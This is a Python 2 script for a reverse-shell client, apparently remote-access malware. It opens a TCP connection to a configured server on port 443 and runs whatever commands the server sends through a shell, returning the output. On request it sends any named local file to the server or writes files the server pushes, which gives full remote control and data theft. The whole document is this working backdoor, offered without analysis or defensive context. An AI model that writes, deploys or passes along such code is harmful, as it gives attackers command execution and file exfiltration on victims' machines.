import os
import socket
import subprocess
import sys

host = '127.0.0.1'
port = 443

def connect():
    # Create socket & connect to server
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print "[-] Cannot create socket."
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] Cannot connect to server."


def send_file():
    name_f = s.recv(1024)
    print "Sending File: ", name_f
    snd_f = open(name_f, "rb")
    read = snd_f.read()
    s.send(read)


def recover_file():
    namef = s.recv(1024)
    word_l = namef.split("/")
    filename = word_l[-1]
    print "[+] Filename: ", filename
    data_f = s.recv(10000)
    rcv_f = open(filename, "wb")
    rcv_f.write(data_f)
    rcv_f.close()
    print "[+] Retrieved File"


def cd(s):
    print "[+] Current Directory: ", os.getcwd()
    os.chdir(s)
    print "[+] New Directory: ", os.getcwd()
    newdir = "[+] New Directory\n", os.getcwd()


def command():
    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = cmd.stdout.read() + cmd.stderr.read()
    s.send(output)
    cmd.terminate()

def main():
    while True:
        try:
            global srv_cmd
            srv_cmd = s.recv(1024)
        except socket.error:
            print "Cannot receive Command"
        split = srv_cmd.split(" ")
        cd = split[0]
        path = split[-1]
        if srv_cmd == "quit":
            print "[-] Interactive Mode Disabled"
        elif srv_cmd == "disconnect":
            print "[-] Disconnecting from server"
            s.close()
            exit()
        elif srv_cmd == "snd_file":
            send_file()
        elif srv_cmd == "rcv_file":
            recover_file()
        # Change Directory & Interactive Shell
        else:
            if cd == "cd":
                os.chdir(path)
                print "[+] New Directory: ", os.getcwd()
            else:
                command()
    s.close()

connect()
main()
